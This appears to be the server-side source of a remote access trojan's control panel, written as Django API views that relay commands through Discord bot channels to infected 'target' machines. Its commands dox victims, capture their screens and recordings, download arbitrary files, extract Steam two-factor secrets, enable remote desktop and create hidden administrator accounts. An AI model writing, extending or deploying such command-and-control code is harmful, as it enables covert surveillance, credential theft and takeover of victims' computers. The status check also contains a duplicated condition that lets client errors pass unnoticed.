import os
import json
import requests
from django.http import JsonResponse
from rest_framework.decorators import api_view
from dotenv import load_dotenv, find_dotenv


load_dotenv(find_dotenv())
__TOKEN                      = os.environ.get("DISCORD_TOKEN") # should be in string type!
__DISCORD_TARGETS_CHANNEL_ID = os.environ.get("DISCORD_TARGETS_CHANNEL_ID")


def __get_target_channel_id_by_uuid(target_uuid):
    headers = {'authorization': 'Bot ' + __TOKEN}
    response = requests.get(f"https://discord.com/api/v9/channels/{__DISCORD_TARGETS_CHANNEL_ID}/messages", headers = headers)

    # verify the request succeeded
    if (str(response.status_code).startswith('5') or str(response.status_code).startswith('5')):
        return None

    messages = json.loads(response.text)
    targets = list(map(lambda message: json.loads(message['content']), messages))

    for target in targets:
        if target['identifier'] == target_uuid:
            return target['channel_id']

    return None


def __send_discord_command(target_uuid, command):
    target_text_channel_id = __get_target_channel_id_by_uuid(target_uuid)
    
    # verify target text channel id was provided
    if target_text_channel_id is None:
        return

    headers = {
        'authorization': 'Bot ' + __TOKEN,
        'content-type': 'application/json'
    }

    data = json.dumps({
        'content': command
    })

    requests.post(f"https://discord.com/api/v9/channels/{target_text_channel_id}/messages", headers = headers, data = data)


@api_view(['GET'])
def dox(request, target_uuid):
    command = "!dox"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def mouse(request, target_uuid, freeze_time):
    command = f"!mouse {freeze_time}"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def screen(request, target_uuid):
    command = "!screen"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def download(request, target_uuid, path):
    command = f"!download {path}"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def record(request, target_uuid, record_time):
    command = f"!record {record_time}"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def disconnect(request, target_uuid):
    command = "!disconnect"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def safe_disconnect(request, target_uuid):
    command = "!safe_disconnect"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def getSteam2fa(request, target_uuid):
    command = "!getSteam2fa"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def rdp_enable(request, target_uuid):
    command = "!rdp_enable"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})

@api_view(['GET'])
def create_admin_user(request, target_uuid):
    command = "!create_admin_user"
    __send_discord_command(target_uuid, command)
    return JsonResponse({'channel': target_uuid, 'command': command})